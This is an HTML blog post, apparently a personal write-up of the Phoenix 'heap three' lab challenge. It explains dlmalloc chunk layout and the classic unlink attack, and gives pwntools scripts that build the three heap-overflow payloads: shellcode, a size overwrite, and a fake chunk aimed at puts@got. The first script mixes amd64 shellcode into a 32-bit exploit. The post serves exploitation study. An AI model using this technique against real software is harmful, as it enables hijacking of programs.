@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html class="default_colors_property">
+  <base href="/home/tabacco/tech/coding/web/execius.github.io/" target="">
+  <head>
+    <link rel="stylesheet" href="rsc/css/post.css">
+    <link rel="stylesheet" href="rsc/css/code.css">
+    <meta name="description" content="exploiting the infamous doug lea heap implementation, classic unlink!">
+    <title>Execius : phoenix heap 3 - classic heap unlink attack</title>
+          
+    <link rel="stylesheet" href="rsc/css/mainstyle.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="keywords" content="binary exploitation, hacking, pwn, reverse engineering , Execius">
+    <meta name="author" content="Execius">
+
+
+  </head>
+
+  <body>
+          
+    <nav class="bar navbar">
+
+      <div class="home_logo bar_item">
+        <a class="button logo_text"  href="index.html" >Execius</a>
+      </div>
+
+      <div class="categories bar_item">
+        <a class="button" href="./rsc/html/topics/index.html"><i class="fa-solid fa-folder"></i>Topics</a>
+        <a class="button" href="rsc/html/feed/index.html"><i class="fa-solid fa-square-rss"></i>Feed</a>
+        <a class="button" href="rsc/html/resources/index.html"><i class="fa-solid fa-book"></i> resources </a>
+      </div>
+
+    </nav>
+
+
+    <div class="layout">
+      <main class="content">
+
+        <div class="post">
+          <h2>intruduction and context</h2>
+<ul>
+<li>this level is interesting because unlike the previous level it doesn't depend on the programmer of the binary being stupid beyond saving , this time we're abusing the heap algorithm itself , in what is known as an <code>unlink()</code> attack.</li>
+<li>before doing this challenge i had no idea how the heap works so i had to understand the heap first ,i read the glibc implementation of malloc , the analysis is in the article <a href="the-heap.html">THE HEAP</a>, i did that because in am dumb more than a programmer who calls a variable  that the user can modify  ,instead of reading the implementation of doug lea that is used in the challenge and is fairly simple ,i read the latest glibc wich is more complex and ended up not contributing anything to my progress .</li>
+<li>anyway ,  i went and did a bit of analysis of dlmalloc , it's on <a href="malloc-source-code-analysis.html">malloc source code analysis</a> article  , and finally i had a bit of an idea on how to exploit that binary </li>
+<li>i will be working on the 32 bit version of the challenge , linux , little endian. </li>
+</ul>
+<h2>Analysis of the binary</h2>
+<ul>
+<li>running the binary alone produces a segfault , and after playing with it one could figure out that it takes three command line arguments , that is confirmed in the source code :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;time.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Level was successfully completed at @ %ld seconds past the Epoch</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">c</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+<span class="w">  </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+<span class="w">  </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
+
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;dynamite failed?</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>as we see , the program mallocs three variables <strong>consecutively</strong> and this is the first allocation in the program (which means their blocks are probably contiguous ) </li>
+<li>second we have a strcpy from the first command line arguments to each of the variables , this is clearly a buffer overflow since we can write a string of any size , we can go beyond the bounds of the variables </li>
+<li>here is how heap chunks look in memory , along with some comments from doug lea himself:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="cm">/*</span>
+<span class="cm">   malloc_chunk details:</span>
+
+<span class="cm">    (The following includes lightly edited explanations by Colin Plumb.)</span>
+
+<span class="cm">    Chunks of memory are maintained using a `boundary tag&#39; method as</span>
+<span class="cm">    described in e.g., Knuth or Standish.  (See the paper by Paul</span>
+<span class="cm">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span>
+<span class="cm">    survey of such techniques.)  Sizes of free chunks are stored both</span>
+<span class="cm">    in the front of each chunk and at the end.  This makes</span>
+<span class="cm">    consolidating fragmented chunks into bigger chunks very fast.  The</span>
+<span class="cm">    size fields also hold bits representing whether chunks are free or</span>
+<span class="cm">    in use.</span>
+
+<span class="cm">    An allocated chunk looks like this:</span>
+
+
+<span class="cm">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Size of previous chunk, if allocated            | |</span>
+<span class="cm">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Size of chunk, in bytes                         |P|</span>
+<span class="cm">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             User data starts here...                          .</span>
+<span class="cm">            .                                                               .</span>
+<span class="cm">            .             (malloc_usable_space() bytes)                     .</span>
+<span class="cm">            .                                                               |</span>
+<span class="cm">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Size of chunk                                     |</span>
+<span class="cm">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+
+
+<span class="cm">    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of</span>
+<span class="cm">    the malloc code, but &quot;mem&quot; is the pointer that is returned to the</span>
+<span class="cm">    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.</span>
+
+<span class="cm">    Chunks always begin on even word boundries, so the mem portion</span>
+<span class="cm">    (which is returned to the user) is also on an even word boundary, and</span>
+<span class="cm">    thus at least double-word aligned.</span>
+
+<span class="cm">    Free chunks are stored in circular doubly-linked lists, and look like this:</span>
+
+<span class="cm">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Size of previous chunk                            |</span>
+<span class="cm">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">    `head:&#39; |             Size of chunk, in bytes                         |P|</span>
+<span class="cm">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Forward pointer to next chunk in list             |</span>
+<span class="cm">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Back pointer to previous chunk in list            |</span>
+<span class="cm">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">            |             Unused space (may be 0 bytes long)                .</span>
+<span class="cm">            .                                                               .</span>
+<span class="cm">            .                                                               |</span>
+<span class="cm">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+<span class="cm">    `foot:&#39; |             Size of chunk, in bytes                           |</span>
+<span class="cm">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
+
+<span class="cm">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span>
+<span class="cm">    chunk size (which is always a multiple of two words), is an in-use</span>
+<span class="cm">    bit for the *previous* chunk.  If that bit is *clear*, then the</span>
+<span class="cm">    word before the current chunk size contains the previous chunk</span>
+<span class="cm">    size, and can be used to find the front of the previous chunk.</span>
+<span class="cm">    The very first chunk allocated always has this bit set,</span>
+<span class="cm">    preventing access to non-existent (or non-owned) memory. If</span>
+<span class="cm">    prev_inuse is set for any given chunk, then you CANNOT determine</span>
+<span class="cm">    the size of the previous chunk, and might even get a memory</span>
+<span class="cm">    addressing fault when trying to do so.</span>
+</code></pre></div>
+
+<ul>
+<li>i am going to show you how that might look in memory :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>+-------------------+-------------------+-------------------+
+|  Heap Bloc a      |  Heap Block b     |  Heap Block c     |
++---------+---------+---------+---------+---------+---------+
+| Header  |  Data   | Header  |  Data   | Header  |  Data   |
+| (size,  | (alloc  | (size,  | (alloc  | (size,  | (alloc  |
+| flags)  | space)  | flags)  | space)  | flags)  | space)  |
++---------+---------+---------+---------+---------+---------+
+</code></pre></div>
+
+<ul>
+<li>the header of a heap chunks looks like this :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">  </span><span class="n">INTERNAL_SIZE_T</span><span class="w">      </span><span class="n">prev_size</span><span class="p">;</span><span class="w">  </span><span class="cm">/* Size of previous chunk (if free).  */</span>
+<span class="w">  </span><span class="n">INTERNAL_SIZE_T</span><span class="w">      </span><span class="n">size</span><span class="p">;</span><span class="w">       </span><span class="cm">/* Size in bytes, including overhead. */</span>
+
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="o">*</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span><span class="w">         </span><span class="cm">/* double links -- used only if free. */</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">malloc_chunk</span><span class="o">*</span><span class="w"> </span><span class="n">bk</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+
+<ul>
+<li>the fd and bk are only used if the block is freed , when it is in use their memory is in user's  allocated space and is used to hold user data , and when the block is freed they are used as links in a doubly linked list of free blocks.</li>
+</ul>
+<h2>the exploit strategy</h2>
+<h2>the core of the exploit</h2>
+<ul>
+<li>i did a fairly detailed analysis in the above mentioned article about dlmalloc , here i am gonna show just some snippets , now when i was reading i knew i had to find something that did arbitrary writes to an address i can control and that was the <code>unlink</code> macro :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="cp">#define unlink(P, BK, FD) {</span>
+<span class="w">          </span><span class="n">FD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span><span class="w">                                                          </span>\
+<span class="w">          </span><span class="n">BK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w">                                                          </span>\
+<span class="w">          </span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="p">;</span><span class="w">  </span><span class="cm">/*dereference*/</span><span class="w">                                        </span>\
+<span class="w">          </span><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="p">;</span><span class="w"> </span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>if i can control the values FD and BK i can write to any address i want . keep this in mind as you read .</li>
+<li>the portion of the free function we'll exploit is this :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="n">nextchunk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">);</span>
+<span class="w">  </span><span class="n">nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chunksize</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nextchunk</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="cm">/* get and clear inuse bit */</span>
+<span class="w">    </span><span class="n">nextinuse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span>
+<span class="w">    </span><span class="n">set_head</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* consolidate forward */</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">unlink</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">bck</span><span class="p">,</span><span class="w"> </span><span class="n">fwd</span><span class="p">);</span>
+<span class="w">      </span><span class="n">size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">nextsize</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>so what we will do is that we'll make it seem that there is another block above <code>c</code> that is empty ,  so the free function would like to merge them and in the process it will call the <code>unlink</code> macro on the chunk we will create and which we will be able to control it's fd and bk pointer to make an arbitrary write </li>
+<li>and how can we do that , as you can see in <code>nextchunk = chunk_at_offset(p, size);</code> , the next chunk is retrieved using an offset that is the size of the current chunk , so if we make the size of c 100 for example , it will jump 100 bytes ahead think that there is a header there </li>
+<li>we can set c to any size we want because we can overwrite it's  header if we overflow <code>b</code> , and we can put fake meta data after the right offset (including our fake fd and bk) if we overflow <code>c</code> so when the free function jumps there it will think it is a valid chunk and call <code>unlink</code> on it.</li>
+<li>after unlink is called , if fd is pointing to 12 bytes before a <code>got</code>  entry (puts@got -12) and bk to  a place that has out shellcode the line <code>FD-&gt;bk = BK;</code> will go to an offset of 12 of fd , because in the struct of chunks <code>bk</code> is after prevsize, size and fd , each of them 4 bytes and thus 12 (this is the way structs work in c everyting is an offset) , which will factor out the -12 from before and land us right on our got entry , and then it will write out bk into that entry , which will be our shellcode that calls the winner function .</li>
+<li>you say why not write the winner function pointer directly , if you havent seen it already ,<code>unlink</code> also writes to BK-&gt;fd in the line <code>FD-&gt;bk = BK;</code> , if the bk is a direct pointer to winner , this line will try to write to a 8 offset of that address which is in  the code section which is non writable and it will crash the program , but if we put an address to a shellcode in the heap it will be fine as long as we keep out shellcode under 8 bytes which it already is , and if it was not we could simply use a <code>jmp</code> instruction at the location in bk and jump to our loong shellcode at a safe offset , but we don't need to do that now  since we just got two small instructions.</li>
+<li>let's just go and make the exploit so we can dive into the technical stuff</li>
+</ul>
+<h2>making the exploit</h2>
+<ul>
+<li>first we'll make input for the first argument that's gonna go into <code>a</code> :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">push</span><span class="p">(</span><span class="n">WINNER_ADDR</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">ret</span><span class="p">()</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">asm</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="n">offset</span><span class="o">=</span><span class="mi">32</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">addressbin</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7ffff7ef6010</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="mi">16</span><span class="o">*</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">shellcode</span>
+<span class="c1">#+p32(0xfffffffc)+p32(0x108)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<ul>
+<li>we basically make a shellcode using shellcraft utility from pwntools , the idea behind the shell code is to push the address of the function i wanna redirect the program to , which is called <code>winner</code> , i found the by simply disassembling it in gdb with <code>(gdb) disassemble winner</code> and after pushing its address we do a <code>ret</code> instruction to jump to it , simple if you know assembly .</li>
+<li>
+<p>we place the shellcode after an offset because when a is freed , the first 8 bytes are gonna be overwritten with arbitrary pointers that represent its <code>fd</code> and <code>bk</code> , so i just placed the shellcode after a 16 offset so it stays safe .</p>
+</li>
+<li>
+<p>now we will make the argv[2] input which will be in b :</p>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">36</span>
+<span class="n">Payload</span> <span class="o">=</span>  <span class="n">offset</span><span class="o">*</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x65</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">Payload</span><span class="p">)</span>
+</code></pre></div>
+
+<ul>
+<li>the offset calculated in this manner : when we allocate a block in the heap malloc adds a 8 bytes for its header and adds some bytes to make the address a multiple of 8 , so when the code called malloc  with 32, it allocated 40 , 32+8 bytes summing up to 40 so no need to align anything . 8 of that 40 is before the address returned to us and is used as a header that holds <code>prevsize</code> and <code>size</code> from the structs earlier  , so we write 32 and then we reach the header of the <code>c</code> chunk , we write another 4 bytes to go after <code>prevsize</code> and at <code>size</code> , and that's how our offset lands us at the location of size so we can modify it and make a fake chunk after c.</li>
+<li>
+<p>we write the offset with giberish and then we make the size of c 0x64 , which is 100 not 101 in this case , since the last bit of the size is used to signal if the previous block is in use (since the size is always aligned to be a multiple of 8 , its lowest 3 bits are never used (try it , see the binary representation of multiples of 8) , so they are not considered when getting the size and are used as flags ), and this that 0x65 is considered a 100 , we set the used flag to 1 so the c chunk is not merged with b , we wanna merge it with the next fake chunk we'll make . </p>
+</li>
+<li>
+<p>now making the fake chunk :</p>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">shellcode_addr</span> <span class="o">=</span><span class="mh">0xf7e69028</span>
+<span class="n">got</span> <span class="o">=</span> <span class="mh">0x804c13c</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">92</span>
+<span class="n">header</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfffffffc</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">got</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+<span class="n">Payload</span> <span class="o">=</span> <span class="n">offset</span><span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">header</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">Payload</span><span class="p">)</span>
+</code></pre></div>
+
+<ul>
+<li>so we got the address of the shellcode simply using the disassembly and gdb to locate <code>a</code> and then jumping a 16 offset </li>
+<li>then the address of the got entry of <code>puts</code> , which i also did found using the disassembly and gdb , beware that the address called in the disassembly is a plt not a got address and you must disassembly that plt address to find the got one that it jump to in the first instruction , a trampoline function .</li>
+<li>remember that our next chunk's user data will start after an offset 100 , but the <code>size</code> and <code>prevsize</code> are behind that by 8 bytes , so if we wanna make the entire header of this fake chunk we'll have to start at an offset of 92 </li>
+<li>we make our header , first we make <code>prevsize</code> and<code>size</code> to 0xfffffffc , and that choice i will explain after a bit , then we set fd 12 bytes before  the address of the got entry of <code>puts</code> , which i explained why in the <a href="heap-buffer-overflow.html#the-exploit-strategy">the exploit strategy section</a> , and the we make our bk to be the address of our shellcode in the heap .</li>
+<li>why 0xfffffffc ? to tell you the reason dear reader , i'm gonna have to admit that i lied to you , we are not setting one fake chunk , we'll be making two of them , now why is that you ask? , in the free function we have : </li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">nextchunk</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="cm">/* get and clear inuse bit */</span>
+<span class="w">        </span><span class="n">nextinuse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span>
+<span class="w">        </span><span class="n">set_head</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">nextsize</span><span class="p">);</span>
+
+<span class="w">        </span><span class="cm">/* consolidate forward */</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">unlink</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span><span class="w"> </span><span class="n">bck</span><span class="p">,</span><span class="w"> </span><span class="n">fwd</span><span class="p">);</span>
+<span class="w">          </span><span class="n">size</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">nextsize</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>the free function doesn't just fetch the next chunk after c but also checks if it is free by checking the header of the chunk after the once we make , in the line  <code>nextinuse =inuse_bit_at_offset(nextchunk, nextsize);</code>, next in use is fetched by adding the size of the fake chunk we created to it's position  and then fetching the flag bit to determine if our fake chunk is free , and we want it to seem so, so we will have to also fake that , here comes the magic of the number 0xfffffffc , to understand what it does , see how negative numbers in binary work , what i am gonna tell is that if adding it to an address is equivalent to substracting 4 from that address , so when the function adds to our fake chunk's address to get the next one , it ends up returning backwards 4 bytes which lands it on the<code>size</code> variable of our fake chunk , and thing that that is in fact the start of the user data of the next chunk , it checks backwards where it thinks would be the size , but there is just the <code>prevsize</code> of our fake chunk , which is also 0xffffffffc  , and since it is aligned by 8 , it interprets it like the PREV_INUSE of the next chunk is not set , so it thinks that our fake chunk is free and executes the unlink where the magic happens .</li>
+</ul>
+<h1>execution</h1>
+<div class="codehilite"><pre><span></span><code>user@phoenix-amd64:~$<span class="w"> </span>/opt/phoenix/i486/heap-three<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>~/heapthreea.py<span class="k">)</span><span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>~/heapthreeb.py<span class="k">)</span><span class="w">   </span><span class="k">$(</span>python<span class="w"> </span>~/heapthreec.py<span class="k">)</span>
+
+
+Level<span class="w"> </span>was<span class="w"> </span>successfully<span class="w"> </span>completed<span class="w"> </span>at<span class="w"> </span>@<span class="w"> </span><span class="m">1740109517</span><span class="w"> </span>seconds<span class="w"> </span>past<span class="w"> </span>the<span class="w"> </span>Epoch
+</code></pre></div>
+
+<ul>
+<li>and that is it friend , heap chunks spoofed , unlink abused , control flow hijacked .</li>
+</ul>
+        </div>
+      </main>
+    </div>
+  </body>
+      
+    <footer>
+
+      <div class="contactme bar_item">
+        <a class="button" href="https://x.com/execius"><i class="fa-brands fa-x-twitter fa-2x"></i></a> 
+      </div>
+    </footer>
+
+</html> 
+
